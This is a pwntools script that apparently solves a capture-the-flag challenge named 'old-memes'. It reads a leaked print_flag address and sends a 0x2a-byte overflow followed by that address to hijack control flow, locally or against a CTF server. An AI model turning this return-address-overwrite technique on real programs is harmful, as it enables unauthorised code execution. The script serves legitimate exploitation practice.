from pwn import *

context.log_level = "debug"
context.arch = "i386"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./old-memes"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("old-memes-never-die.ctf.zone", 4242)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


io.recvuntil("here: ")
print_flag = int(io.recv(10), 16)
log.success("print_flag :-----> " + hex(print_flag))

payload = b"what?"

io.sendlineafter("> ", payload)

payload = b"b"*0x2a
payload += p32(print_flag)

io.sendlineafter("> ", payload)

data = io.recvline()
log.success(data)
io.interactive()

